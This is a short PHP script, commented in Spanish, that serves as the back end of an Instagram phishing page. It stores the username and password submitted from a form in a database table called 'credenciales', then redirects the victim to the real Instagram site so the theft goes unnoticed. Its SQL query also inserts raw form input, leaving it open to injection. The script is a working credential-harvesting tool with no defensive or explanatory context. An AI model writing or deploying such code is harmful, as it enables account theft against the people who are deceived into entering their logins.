<?php
include("include/conecta.php");

$usuario = $_POST['usuario'];
$password = $_POST['password'];

$sql = "INSERT INTO credenciales (usuario, password) VALUES ('$usuario', '$password')";
$conn->query($sql);

// Después de guardar, redirige a la página real de Instagram
header("Location: https://www.instagram.com/");
exit();
?>